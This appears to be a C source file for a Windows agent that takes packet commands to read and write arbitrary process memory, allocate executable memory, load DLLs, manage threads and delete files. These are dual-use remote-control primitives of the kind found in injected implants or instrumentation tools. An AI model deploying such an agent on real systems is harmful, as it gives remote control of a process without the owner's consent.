#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include "commands.h"
#include "structures.h"
#include "file.h"
#include "threads.h"

// generate a response packet
char *gen_response(int response, int *size, int additional) {
	char *ret = NULL;
	
	if ((ret = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ZmqRet) + additional + 1)) == NULL)
		return NULL;

	ZmqRet *resp = (ZmqRet *)ret;
	if (size != NULL)
		*size = sizeof(ZmqRet) + additional;
	resp->response = response;
	resp->extra_len = additional;
	return ret;
}

char *cmd_exit(char *_ptr, int pkt_len, int *ret_size) {
	ExitProcess(0);
}


char *cmd_thread_new(char *_ptr, int pkt_len, int *ret_size) {
	char *ret = NULL;
	ThreadInfo *tptr = thread_new();

	if (tptr == NULL) {
		ret = gen_response(0,ret_size,0);
	} else {
		ret = gen_response(1,ret_size,sizeof(int));
		CopyMemory((char *)(ret+sizeof(ZmqRet)), &tptr->thread_id, sizeof(int));
		LeaveCriticalSection(&tptr->CS);
	}

	return ret;
}


char *cmd_thread_kill(char *_ptr, int pkt_len, int *ret_size) {
	int *id = (int *)_ptr;
	char *ret = NULL;

	ThreadInfo *tptr = thread_search(*id,0);
	if (tptr != NULL) {
		tptr->dead = 1;
		LeaveCriticalSection(&tptr->CS);
	}
	ret = gen_response(1,ret_size, 0);
	return ret;
}


// this should start at MemTransfer (not ZmqPkt)
char *cmd_mem_transfer(void *tinfo, char *_ptr, int pkt_len, int *ret_size) {
	char *ptr = NULL;
	ZmqPkt *pkt = (ZmqPkt *)(_ptr);
	int success = 0;
	char *ret = NULL;
	MemTransfer *meminfo = (MemTransfer *)((char *)_ptr + sizeof(ZmqPkt));
	char fbuf[1024];

	if (pkt_len < (sizeof(ZmqPkt) + sizeof(MemTransfer))) return NULL;

	if (meminfo->cmd == MEM_PUSH) {
		//wsprintf(fbuf, "MEM_PUSH %p len %d\r\n", meminfo->addr, meminfo->len);
		//OutputDebugString(fbuf);
		// we will need to supoprt exceptions for this later!
		CopyMemory((void *)meminfo->addr, (char *)(_ptr + sizeof(ZmqPkt) +  sizeof(MemTransfer)), meminfo->len);
		ret = gen_response(1, ret_size, 0);
	} else if (meminfo->cmd == MEM_PEEK) {
			ret = gen_response(1,ret_size, meminfo->len);
			if (ret != NULL)
				CopyMemory((char *)(ret + sizeof(ZmqRet)), meminfo->addr, meminfo->len);
	} else if (meminfo->cmd == MEM_ALLOC) {
		DWORD_PTR newptr = NULL;
		if (meminfo->addr == NULL && !meminfo->_virtual)
			newptr = (DWORD_PTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, meminfo->len);
		else
			newptr = (DWORD_PTR)VirtualAlloc(meminfo->addr, meminfo->len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		
		DWORD last = GetLastError();
		if (newptr != NULL) {
			ret = gen_response(1,ret_size, sizeof(DWORD_PTR));
			if (ret != NULL)
				CopyMemory((char *)(ret + sizeof(ZmqRet)), &newptr, sizeof(DWORD_PTR));
			//wsprintf(fbuf, "SUCCESS allocate %p [%d] Last %d\r\n", meminfo->addr, meminfo->len, last);
			//OutputDebugString(fbuf);

		} else {
			
			
			//wsprintf(fbuf, "Couldnt allocate %p [%d] Last %d\r\n", meminfo->addr, meminfo->len, last);
			//OutputDebugString(fbuf);
			success = 0;
			ret = gen_response(0, ret_size, 0);
		}
	} else if (meminfo->cmd == MEM_DEALLOC) {
		ZeroMemory(meminfo->addr, meminfo->len);
		if (!meminfo->_virtual)
			HeapFree(GetProcessHeap(), 0, meminfo->addr);
		else
			VirtualFree(meminfo->addr, 0, MEM_RELEASE);

		ret = gen_response(1, ret_size, 0);
		
	} else if (meminfo->cmd == MEM_ZERO) {
		ZeroMemory(meminfo->addr, meminfo->len);

		ret = gen_response(1,ret_size, 0);
	}

	//if (success == 0)ret = gen_response(0,ret_size, 0);

	return ret;
}


char *cmd_dll(char *ptr, int pkt_len, int *ret_size) {
	char *ret = NULL;
	char *name = (char *)(ptr + 1);
	if (ptr[0] == LOAD_DLL) {
		HMODULE loadret = LoadLibrary(name);
		ret = gen_response(1,ret_size, sizeof(DWORD_PTR));
		if (ret != NULL)
			CopyMemory((char *)(ret + sizeof(ZmqRet)), &loadret, sizeof(DWORD_PTR));
	} else if (ptr[1] == UNLOAD_DLL) {	
		ret = gen_response(1,ret_size, 0);
	}

	return ret;
}


char *file_cmd(char *_ptr, int pkt_len, int *ret_size) {
	char *ptr = (char *)_ptr;
	char *ret = NULL;
	char *filename = NULL;
	char *data = NULL;
	int data_len = 0;
	char *name = NULL;
	FileInfo *finfo = (FileInfo *)ptr;

	if (pkt_len < sizeof(FileInfo))
		return gen_response(0,ret_size,0);

	if (pkt_len < (int)(sizeof(FileInfo) + finfo->data_len + finfo->name_len))
		return gen_response(0,ret_size,0);

	ptr += sizeof(FileInfo);

	if (finfo->name_len) {
		if ((name = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, finfo->name_len + 2)) == NULL)
			return gen_response(0,ret_size,0);

		CopyMemory(name, ptr, finfo->name_len);
		ptr += finfo->name_len;
	} else {
		return gen_response(0,ret_size,0);
	}

	if (finfo->data_len) {
		if ((data = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, finfo->data_len + 1)) == NULL)
			return gen_response(0, ret_size, 0);

		CopyMemory(data, ptr, finfo->data_len);
		ptr += finfo->data_len;
	}
	

	/*if (finfo->cmd == FILE_READ) {
		unsigned long size = 0;
		char *rdata = NULL;
		rdata = FileGetContents(name, &size);

		if (rdata == NULL && !size) {
			ret = gen_response(0,ret_size, 0);
		} else {
			ret = gen_response(1,ret_size, size);

			if (ret != NULL)
				CopyMemory((char *)(ret + sizeof(ZmqRet)),rdata,size);
		}
	} else if (finfo->cmd == FILE_WRITE) {
		if (finfo->overwrite)
			DeleteFile(name);

		if (FilePutContents(name, data, data_len, 0) == 1)
			ret = gen_response(1,ret_size,0);
	} else*/
	if (finfo->cmd == FILE_DELETE) {
		DeleteFile(name);
		ret = gen_response(1,ret_size,0);
	}

	return ret;

}
